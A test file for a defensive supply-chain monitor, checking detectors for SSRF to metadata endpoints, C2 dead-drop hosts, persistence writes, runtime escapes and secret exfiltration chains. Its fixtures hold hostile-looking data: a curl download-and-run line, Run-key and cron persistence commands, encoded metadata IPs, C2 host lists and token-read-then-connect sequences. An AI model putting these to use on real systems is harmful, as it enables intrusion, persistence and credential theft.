import { describe, it, expect } from 'vitest';
import {
  detectExfilChains,
  detectTechnique,
  isAltRuntimeEscape,
  isCiWorkflowPath,
  isCloudMetadataHost,
  isDeadDropHost,
  isEditorHookPath,
  isInternalTarget,
  isGitHookPath,
  isRegistryPublish,
  isServicePersistenceCommand,
  isServicePersistencePath,
  isTlsVerificationDisabled,
  normalizeIpv4,
} from '../../src/domain/threat.js';
import type { DhEvent } from '../../src/domain/event.js';

describe('normalizeIpv4 — evasion-resistant IPv4 parsing', () => {
  it.each([
    ['169.254.169.254', '169.254.169.254'], // dotted decimal
    ['2852039166', '169.254.169.254'], // single decimal (the classic SSRF trick)
    ['0xA9FEA9FE', '169.254.169.254'], // single hex
    ['0xa9.0xfe.0xa9.0xfe', '169.254.169.254'], // dotted hex
    ['0251.0376.0251.0376', '169.254.169.254'], // dotted octal
    ['::ffff:169.254.169.254', '169.254.169.254'], // IPv4-mapped IPv6
    ['169.16689662', '169.254.169.254'], // inet_aton 2-part (a.rest24)
    ['169.254.43518', '169.254.169.254'], // inet_aton 3-part (a.b.rest16)
    ['0xa9.0xfea9fe', '169.254.169.254'], // 2-part with hex tail
  ])('normalizes %s → %s', (input, expected) => {
    expect(normalizeIpv4(input)).toBe(expected);
  });

  it('leaves numeric-looking non-IPs and out-of-range parts unchanged', () => {
    expect(normalizeIpv4('169.999999999999')).toBe('169.999999999999'); // tail overflow
    expect(normalizeIpv4('300.1')).toBe('300.1'); // first octet > 255
  });

  it('leaves non-integer hosts unchanged', () => {
    expect(normalizeIpv4('example.com')).toBe('example.com');
    expect(normalizeIpv4('metadata.google.internal')).toBe('metadata.google.internal');
  });
});

describe('isCloudMetadataHost — cloud instance-metadata endpoints', () => {
  it.each([
    'http://169.254.169.254/latest/meta-data/', // AWS IMDS
    '169.254.169.254:80',
    'http://2852039166/', // decimal-encoded AWS IMDS
    'http://0xA9FEA9FE/latest/', // hex-encoded
    '169.254.170.2', // ECS task metadata
    'http://169.254.170.23/v1/credentials', // EKS Pod Identity
    '100.100.100.200', // Alibaba
    '[fd00:ec2::254]:80', // AWS IMDS over IPv6
    'http://metadata.google.internal/computeMetadata/v1/', // GCP
    'metadata.goog',
    'metadata.google.internal.', // trailing DNS root dot
    'http://169.16689662/latest/meta-data/', // inet_aton 2-part AWS IMDS
    'http://instance-data/latest/meta-data/', // AWS VPC DNS alias
    'instance-data.ec2.internal',
    'metadata.tencentyun.com', // Tencent Cloud
    '169.254.0.23', // Tencent Cloud metadata IP
  ])('flags %s', (detail) => {
    expect(isCloudMetadataHost(detail)).toBe(true);
  });

  it.each([
    'https://api.example.com/v1',
    'registry.npmjs.org:443',
    '169.254.169.253', // adjacent link-local, not metadata
    '10.0.0.1',
  ])('does not flag %s', (detail) => {
    expect(isCloudMetadataHost(detail)).toBe(false);
  });
});

describe('isDeadDropHost — public dead-drop / relay C2 channels', () => {
  it.each([
    'https://mainnet.infura.io/v3/KEY', // blockchain RPC (the keyv Ethereum-C2 vector)
    'eth.llamarpc.com',
    'api.etherscan.io:443',
    'cloudflare-eth.com',
    'https://api.telegram.org/bot123/sendMessage', // chat exfil
    'discord.com',
    'canary.discord.com:443',
    'pastebin.com/raw/abc',
    'https://0x0.st/',
    'transfer.sh',
    'gateway.pinata.cloud', // IPFS gateway
    'cloudflare-ipfs.com',
  ])('flags %s', (detail) => {
    expect(isDeadDropHost(detail)).toBe(true);
  });

  it.each([
    'https://registry.npmjs.org/', // the real registry, not a dead drop
    'api.github.com',
    'raw.githubusercontent.com', // high-FP: deliberately not in the set
    'example.com',
    'notpastebin.com.evil.test', // suffix trick: not actually under pastebin.com
  ])('does not flag %s', (detail) => {
    expect(isDeadDropHost(detail)).toBe(false);
  });
});

describe('isInternalTarget — SSRF redirect payoff (internal / metadata IPs)', () => {
  it.each([
    '127.0.0.1', // loopback
    '10.5.5.5', // private
    '172.16.0.1',
    '172.31.255.255',
    '192.168.1.1',
    '169.254.169.254', // link-local / cloud metadata
    '100.100.100.200', // (also CGNAT range) Alibaba metadata
    '0.0.0.0',
    '::1', // IPv6 loopback
    '[::1]',
    'fe80::1', // IPv6 link-local
    'fd00:ec2::254', // IPv6 ULA (AWS IMDS over IPv6)
    '::ffff:10.0.0.1', // IPv4-mapped private
    '2130706433', // decimal 127.0.0.1
    '0x7f000001', // hex 127.0.0.1
  ])('flags %s', (ip) => {
    expect(isInternalTarget(ip)).toBe(true);
  });

  it.each([
    '93.184.216.34', // public (example.com)
    '8.8.8.8',
    '1.1.1.1',
    '172.32.0.1', // just outside 172.16/12
    '192.169.0.1', // not 192.168/16
    '2606:2800:220:1:248:1893:25c8:1946', // public IPv6
    'api.example.com', // a hostname is not an internal IP
  ])('does not flag %s', (ip) => {
    expect(isInternalTarget(ip)).toBe(false);
  });
});

describe('isCiWorkflowPath — CI/CD pipeline persistence across providers', () => {
  it.each([
    // GitHub Actions and the compatible forges.
    '/repo/.github/workflows/shai-hulud.yml',
    '/repo/.github/workflows/ci.yaml',
    '.github/workflows/deploy.yml',
    'C:\\proj\\.github\\workflows\\x.yml',
    '/repo/.gitea/workflows/ci.yml',
    '/repo/.forgejo/workflows/ci.yaml',
    // Local / composite GitHub Action manifests.
    '/repo/.github/actions/build/action.yml',
    '/repo/.github/actions/setup/action.yaml',
    // Dot-dir configs.
    '/repo/.circleci/config.yml',
    '/repo/.buildkite/pipeline.yml',
    '/repo/.woodpecker.yml',
    '/repo/.woodpecker/build.yml',
    // Single-file root pipeline definitions.
    '/repo/.gitlab-ci.yml',
    '/repo/azure-pipelines.yml',
    '/repo/.travis.yml',
    '/repo/bitbucket-pipelines.yml',
    '/repo/.drone.yml',
    '/repo/appveyor.yml',
    '/repo/.cirrus.yml',
    '/repo/Jenkinsfile',
    // Windows trailing-junk (silently dropped by the OS, so it opens the file).
    '/repo/.gitlab-ci.yml ',
    'C:\\proj\\.github\\workflows\\x.yml.',
  ])('flags %s', (path) => {
    expect(isCiWorkflowPath(path)).toBe(true);
  });

  it.each([
    '/repo/.github/dependabot.yml', // not under workflows/
    '/repo/.github/workflows/', // the directory, no file
    '/repo/src/workflows/x.yml', // not under .github
    '/repo/.github/workflows/notes.txt', // not a yaml file
    '/repo/.github/actions/build/README.md', // action dir, not the manifest
    '/repo/config.yml', // a plain config file, not a CI definition
    '/repo/src/travis.yml', // not the root .travis.yml basename
  ])('does not flag %s', (path) => {
    expect(isCiWorkflowPath(path)).toBe(false);
  });
});

describe('isGitHookPath — git-hook persistence', () => {
  it.each([
    '/repo/.git/hooks/pre-commit',
    '/repo/.git/hooks/post-checkout',
    '/repo/.git/hooks/pre-push',
    '.git/hooks/prepare-commit-msg',
    'C:\\proj\\.git\\hooks\\post-merge',
    '/repo/.husky/pre-commit',
    '/repo/.husky/post-checkout',
    '/repo/.git/hooks/pre-commit ', // Windows trailing space
  ])('flags %s', (path) => {
    expect(isGitHookPath(path)).toBe(true);
  });

  it.each([
    '/repo/.git/hooks/pre-commit.sample', // git's inert template
    '/repo/.git/hooks/README', // not an executable hook name
    '/repo/.husky/_/husky.sh', // Husky's own internals
    '/repo/.husky/_/.gitignore',
    '/repo/hooks/pre-commit', // not under .git or .husky
    '/repo/.git/config', // not a hook
  ])('does not flag %s', (path) => {
    expect(isGitHookPath(path)).toBe(false);
  });
});

describe('isEditorHookPath — editor/AI-agent hook persistence (keyv worm)', () => {
  it.each([
    '/repo/.vscode/tasks.json', // runOn: folderOpen auto-run
    '/repo/.vscode/settings.json', // tool-path RCE
    '/repo/.vscode/launch.json',
    'C:\\proj\\.vscode\\tasks.json',
    '/repo/my.code-workspace',
    '/repo/.claude/settings.json', // SessionStart hook
    '/repo/.claude/settings.local.json',
    '/repo/.claude/hooks/on-start.sh',
    '/repo/.cursor/mcp.json',
    '/repo/.windsurf/mcp.json',
    '/repo/.devcontainer/devcontainer.json', // postCreateCommand
    '/repo/.devcontainer/backend/devcontainer.json', // nested
    '/repo/.idea/runConfigurations/app.xml', // JetBrains
    '/repo/.envrc', // direnv
    '/repo/.vscode/tasks.json ', // Windows trailing junk
  ])('flags %s', (path) => {
    expect(isEditorHookPath(path)).toBe(true);
  });

  it.each([
    '/repo/.vscode/extensions.json', // recommendations, not executable
    '/repo/.vscode/notes.json',
    '/repo/.claude/README.md',
    '/repo/src/settings.json', // not under an editor dir
    '/repo/.devcontainer/Dockerfile',
    '/repo/config.code-workspace/inner.txt', // dir named like a workspace, then a file
    '/repo/.idea/workspace.xml', // not a run configuration
  ])('does not flag %s', (path) => {
    expect(isEditorHookPath(path)).toBe(false);
  });
});

describe('isRegistryPublish — registry self-replication', () => {
  it.each([
    'npm publish',
    'npm publish --access public',
    'pnpm publish',
    'yarn publish',
    '/usr/local/bin/npm publish',
  ])('flags %s', (command) => {
    expect(isRegistryPublish(command)).toBe(true);
  });

  it.each(['npm install', 'npm run build', 'node publish.js', 'git publish-branch'])(
    'does not flag %s',
    (command) => {
      expect(isRegistryPublish(command)).toBe(false);
    },
  );
});

describe('detectTechnique — capability + detail → named technique', () => {
  it('maps each capability to its technique', () => {
    expect(detectTechnique('net.connect', 'http://169.254.169.254/')).toBe(
      'cloud-metadata',
    );
    expect(detectTechnique('net.resolve', '2852039166')).toBe('cloud-metadata');
    expect(detectTechnique('net.connect', 'mainnet.infura.io:443')).toBe('dead-drop-c2');
    expect(detectTechnique('net.resolve', 'api.telegram.org')).toBe('dead-drop-c2');
    expect(detectTechnique('fs.write', '/r/.github/workflows/x.yml')).toBe(
      'ci-workflow-persistence',
    );
    expect(detectTechnique('fs.write', '/r/.gitlab-ci.yml')).toBe(
      'ci-workflow-persistence',
    );
    expect(detectTechnique('fs.write', '/r/.git/hooks/pre-commit')).toBe(
      'git-hook-persistence',
    );
    expect(detectTechnique('fs.write', '/r/.husky/pre-commit')).toBe(
      'git-hook-persistence',
    );
    expect(detectTechnique('fs.write', '/r/.vscode/tasks.json')).toBe(
      'editor-hook-persistence',
    );
    expect(detectTechnique('fs.write', '/r/.claude/settings.json')).toBe(
      'editor-hook-persistence',
    );
    expect(detectTechnique('process.spawn', 'npm publish')).toBe('registry-publish');
  });

  it('returns null for mundane calls', () => {
    expect(detectTechnique('net.connect', 'api.example.com:443')).toBeNull();
    expect(detectTechnique('fs.write', '/r/dist/index.js')).toBeNull();
    expect(detectTechnique('process.spawn', 'npm install')).toBeNull();
    expect(detectTechnique('fs.read', '169.254.169.254')).toBeNull(); // wrong capability
  });
});

function ev(partial: Partial<DhEvent>): DhEvent {
  return {
    capability: 'fs.read',
    package: 'evil',
    origin: 'dependency',
    detail: '',
    stack: [],
    sensitive: false,
    allowed: true,
    blocked: false,
    timestamp: 0,
    ...partial,
  };
}

describe('detectExfilChains — secret-read then network by the same dependency', () => {
  it('flags a package that read a secret and then reached the network', () => {
    const chains = detectExfilChains([
      ev({ capability: 'fs.read', detail: '/home/a/.npmrc', sensitive: true }),
      ev({ capability: 'net.connect', detail: 'webhook.site:443' }),
    ]);
    expect(chains).toEqual([
      { package: 'evil', secret: '/home/a/.npmrc', sink: 'webhook.site:443' },
    ]);
  });

  it('does not flag network BEFORE the secret read (causal order matters)', () => {
    expect(
      detectExfilChains([
        ev({ capability: 'net.connect', detail: 'api.x.com:443' }),
        ev({ capability: 'fs.read', detail: '/home/a/.ssh/id_rsa', sensitive: true }),
      ]),
    ).toEqual([]);
  });

  it('does not cross packages: pkg A reads, pkg B connects', () => {
    expect(
      detectExfilChains([
        ev({ package: 'a', capability: 'fs.read', detail: '/s/.npmrc', sensitive: true }),
        ev({ package: 'b', capability: 'net.connect', detail: 'x.com:443' }),
      ]),
    ).toEqual([]);
  });

  it('ignores first-party application code and non-sensitive reads', () => {
    expect(
      detectExfilChains([
        ev({
          origin: 'application',
          package: null,
          capability: 'fs.read',
          sensitive: true,
        }),
        ev({ origin: 'application', package: null, capability: 'net.connect' }),
      ]),
    ).toEqual([]);
    expect(
      detectExfilChains([
        ev({ capability: 'fs.read', detail: '/app/config.json', sensitive: false }),
        ev({ capability: 'net.connect', detail: 'x.com:443' }),
      ]),
    ).toEqual([]);
  });

  it('reports each package once (its first egress after a secret)', () => {
    const chains = detectExfilChains([
      ev({ capability: 'env.read', detail: 'NPM_TOKEN', sensitive: true }),
      ev({ capability: 'net.resolve', detail: 'evil.example.com' }),
      ev({ capability: 'net.connect', detail: 'evil.example.com:443' }),
    ]);
    expect(chains).toHaveLength(1);
    expect(chains[0]?.sink).toBe('evil.example.com');
  });
});

describe('isAltRuntimeEscape — a second JS runtime as a way out of the monitor', () => {
  it.each([
    './.cache/bun install', // the 2026 dropper's own shape
    '/tmp/bun run stage2.js',
    'sh -c "$HOME/.cache/bun run loader.js"',
    'curl -sL https://example.invalid/b -o /tmp/deno && /tmp/deno run -A x.ts',
    'C:\\Users\\dev\\AppData\\Local\\Temp\\bun.exe run x.js',
    '/var/folders/x/T/downloads/node stage2.js', // a *dropped* node counts too
  ])('flags %s whoever ran it', (command) => {
    expect(isAltRuntimeEscape(command, 'application')).toBe(true);
    expect(isAltRuntimeEscape(command, 'dependency')).toBe(true);
  });

  it.each([
    'bun install',
    'bun x some-tool',
    'deno run -A build.ts',
    '/usr/local/bin/bun run build',
    'sh -c "bun run build"',
    'npm run build && bun test',
  ])('flags %s from a dependency but not from the application', (command) => {
    expect(isAltRuntimeEscape(command, 'dependency')).toBe(true);
    expect(isAltRuntimeEscape(command, 'unknown')).toBe(true);
    expect(isAltRuntimeEscape(command, 'application')).toBe(false);
  });

  it('does not flag a runtime named as an argument rather than run', () => {
    // The false-positive that would make this signal useless: a package manager
    // *installing* bun is not a package *escaping* into bun.
    expect(isAltRuntimeEscape('npm install bun', 'dependency')).toBe(false);
    expect(isAltRuntimeEscape('npm install --save-dev deno bun', 'dependency')).toBe(
      false,
    );
    expect(isAltRuntimeEscape('echo bun', 'dependency')).toBe(false);
  });

  it('does not flag ordinary node re-execution', () => {
    expect(isAltRuntimeEscape('node build.js', 'dependency')).toBe(false);
    expect(isAltRuntimeEscape('/usr/local/bin/node -e "1"', 'dependency')).toBe(false);
    expect(isAltRuntimeEscape('node-gyp rebuild', 'dependency')).toBe(false);
    expect(
      isAltRuntimeEscape('git clone https://example.invalid/bun', 'dependency'),
    ).toBe(false);
  });
});

describe('isServicePersistencePath — OS-level autostart entries', () => {
  it.each([
    '/home/dev/.config/systemd/user/miasma-monitor.service', // Miasma
    '/etc/systemd/system/gh-token-monitor.service',
    '/home/dev/.config/systemd/user/beacon.timer',
    '/Users/dev/Library/LaunchAgents/com.example.updater.plist', // mastra
    '/Library/LaunchDaemons/com.example.root.plist',
    '/etc/cron.d/backup', // TrapDoor
    '/etc/crontab',
    '/var/spool/cron/crontabs/dev',
    '/home/dev/.ssh/authorized_keys',
    'C:\\Users\\dev\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.lnk',
    '/home/dev/.config/autostart/updater.desktop',
  ])('flags %s', (path) => {
    expect(isServicePersistencePath(path)).toBe(true);
  });

  it.each([
    '/home/dev/project/dist/index.js',
    '/home/dev/.config/systemd/user/README.md', // not a unit file
    '/home/dev/.ssh/known_hosts',
    '/home/dev/Library/Preferences/com.example.plist',
  ])('leaves %s alone', (path) => {
    expect(isServicePersistencePath(path)).toBe(false);
  });
});

describe('isServicePersistenceCommand — registering an autostart entry', () => {
  it.each([
    'launchctl load -w ~/Library/LaunchAgents/com.example.plist',
    'launchctl bootstrap gui/501 /tmp/x.plist',
    'systemctl --user enable --now beacon.service',
    'crontab -',
    '/bin/sh -c "crontab /tmp/job"',
    'schtasks /create /tn Updater /tr C:\\x.exe /sc onlogon',
    'sc create updater binPath= C:\\x.exe',
    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\x.exe',
  ])('flags %s', (command) => {
    expect(isServicePersistenceCommand(command)).toBe(true);
  });

  it.each(['crontab -l', 'systemctl status nginx', 'launchctl list', 'npm run build'])(
    'leaves the read-only verb %s alone',
    (command) => {
      expect(isServicePersistenceCommand(command)).toBe(false);
    },
  );
});

describe('isTlsVerificationDisabled — only the value that actually disables it', () => {
  it('flags the disabling write', () => {
    expect(isTlsVerificationDisabled('NODE_TLS_REJECT_UNAUTHORIZED=0')).toBe(true);
  });

  it('does not flag putting verification back, or a deletion', () => {
    expect(isTlsVerificationDisabled('NODE_TLS_REJECT_UNAUTHORIZED=1')).toBe(false);
    expect(isTlsVerificationDisabled('NODE_TLS_REJECT_UNAUTHORIZED (deleted)')).toBe(
      false,
    );
    expect(isTlsVerificationDisabled('NODE_OPTIONS=--require /tmp/x.js')).toBe(false);
  });
});

describe('detectTechnique — the 0.13 techniques', () => {
  it('names the alternative-runtime escape, and respects origin', () => {
    expect(detectTechnique('process.spawn', 'bun install', 'dependency')).toBe(
      'alt-runtime-escape',
    );
    expect(detectTechnique('process.spawn', 'bun install', 'application')).toBeNull();
    // Default origin is the untrusting reading.
    expect(detectTechnique('process.spawn', './.cache/bun install')).toBe(
      'alt-runtime-escape',
    );
  });

  it('names service persistence from either half', () => {
    expect(
      detectTechnique('fs.write', '/home/d/.config/systemd/user/beacon.service'),
    ).toBe('service-persistence');
    expect(detectTechnique('process.spawn', 'crontab -')).toBe('service-persistence');
  });

  it('names a TLS teardown and an AI-credential read', () => {
    expect(detectTechnique('env.write', 'NODE_TLS_REJECT_UNAUTHORIZED=0')).toBe(
      'tls-verification-disabled',
    );
    expect(detectTechnique('env.write', 'NODE_OPTIONS=--require /tmp/x.js')).toBeNull();
    expect(detectTechnique('fs.read', '/home/d/.claude/.credentials.json')).toBe(
      'ai-credential-theft',
    );
    expect(detectTechnique('fs.read', '/home/d/.codex/auth.json')).toBe(
      'ai-credential-theft',
    );
    expect(detectTechnique('fs.read', '/home/d/project/src/index.ts')).toBeNull();
  });

  it('names the 2026 dead-drop channels added in 0.13', () => {
    for (const host of [
      'https://evil.workers.dev/c2',
      'api.mainnet-beta.solana.com:443',
      'abc.ic0.app',
      'wss://relay.damus.io',
      'https://1a2b.ngrok-free.app/x',
      'https://webhook.site/deadbeef',
      'https://x.trycloudflare.com',
    ]) {
      expect(isDeadDropHost(host)).toBe(true);
      expect(detectTechnique('net.connect', host)).toBe('dead-drop-c2');
    }
  });
});
